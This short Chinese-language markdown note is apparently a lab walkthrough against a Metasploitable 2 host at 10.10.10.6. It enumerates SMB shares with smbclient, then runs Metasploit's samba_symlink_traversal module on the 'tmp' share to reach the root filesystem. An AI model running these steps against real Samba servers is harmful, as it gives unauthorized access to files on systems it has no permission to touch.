# 445_Samba.md

445端口开启了smb服务

先查看share目录

> smbclient -L //10.10.10.6

![image-20210319110924655](../../image/meteaspolitale2/image-20210319110924655.png)

root这里没有密码可以直接回车

使用msf加载模块脚本

> search smb

选择模块

>  use auxiliary/admin/smb/samba_symlink_traversal

设置目标靶机

> set RHOSTS 10.10.10.6

设置share目录

>  set SMBSHARE tmp

查看设置

> options

![image-20210319111129568](../../image/meteaspolitale2/image-20210319111129568.png)

开始利用

> exploit

![image-20210319111217946](../../image/meteaspolitale2/image-20210319111217946.png)

回到smbclient

> smbclient  //10.10.10.6/tmp

进行登录

![image-20210319111322583](../../image/meteaspolitale2/image-20210319111322583.png)

利用成功